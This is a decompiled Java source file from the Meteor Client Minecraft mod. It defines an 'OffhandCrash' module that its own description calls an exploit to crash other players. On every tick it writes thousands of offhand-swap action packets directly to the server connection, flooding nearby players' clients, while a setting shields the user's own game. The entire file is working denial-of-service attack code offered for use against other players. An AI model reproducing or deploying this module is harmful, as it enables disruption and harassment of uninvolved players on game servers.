/*
 * Decompiled with CFR 0.152.
 * 
 * Could not load the following classes:
 *  io.netty.channel.Channel
 *  net.minecraft.network.packet.c2s.play.PlayerActionC2SPacket
 *  net.minecraft.network.packet.c2s.play.PlayerActionC2SPacket$Action
 *  net.minecraft.util.math.BlockPos
 *  net.minecraft.util.math.Direction
 */
package meteordevelopment.meteorclient.systems.modules.player;

import io.netty.channel.Channel;
import meteordevelopment.meteorclient.events.world.TickEvent;
import meteordevelopment.meteorclient.mixin.ClientConnectionAccessor;
import meteordevelopment.meteorclient.settings.BoolSetting;
import meteordevelopment.meteorclient.settings.IntSetting;
import meteordevelopment.meteorclient.settings.Setting;
import meteordevelopment.meteorclient.settings.SettingGroup;
import meteordevelopment.meteorclient.systems.modules.Categories;
import meteordevelopment.meteorclient.systems.modules.Module;
import meteordevelopment.orbit.EventHandler;
import net.minecraft.network.packet.c2s.play.PlayerActionC2SPacket;
import net.minecraft.util.math.BlockPos;
import net.minecraft.util.math.Direction;

public class OffhandCrash
extends Module {
    private static final PlayerActionC2SPacket PACKET = new PlayerActionC2SPacket(PlayerActionC2SPacket.Action.SWAP_ITEM_WITH_OFFHAND, new BlockPos(0, 0, 0), Direction.UP);
    private final SettingGroup sgGeneral;
    private final Setting<Boolean> doCrash;
    private final Setting<Integer> speed;
    private final Setting<Boolean> antiCrash;

    public OffhandCrash() {
        super(Categories.Misc, "offhand-crash", "An exploit that can crash other players by swapping back and forth between your main hand and offhand.");
        this.sgGeneral = this.settings.getDefaultGroup();
        this.doCrash = this.sgGeneral.add(((BoolSetting.Builder)((BoolSetting.Builder)((BoolSetting.Builder)new BoolSetting.Builder().name("do-crash")).description("Sends X number of offhand swap sound packets to the server per tick.")).defaultValue(true)).build());
        this.speed = this.sgGeneral.add(((IntSetting.Builder)((IntSetting.Builder)((IntSetting.Builder)((IntSetting.Builder)new IntSetting.Builder().name("speed")).description("The amount of swaps per tick.")).defaultValue(2000)).min(1).sliderRange(1, 10000).visible(this.doCrash::get)).build());
        this.antiCrash = this.sgGeneral.add(((BoolSetting.Builder)((BoolSetting.Builder)((BoolSetting.Builder)new BoolSetting.Builder().name("anti-crash")).description("Attempts to prevent you from crashing yourself.")).defaultValue(true)).build());
    }

    @EventHandler
    private void onTick(TickEvent.Post event) {
        if (!this.doCrash.get().booleanValue()) {
            return;
        }
        Channel channel = ((ClientConnectionAccessor)this.mc.player.networkHandler.getConnection()).getChannel();
        for (int i = 0; i < this.speed.get(); ++i) {
            channel.write((Object)PACKET);
        }
        channel.flush();
    }

    public boolean isAntiCrash() {
        return this.isActive() && this.antiCrash.get() != false;
    }
}

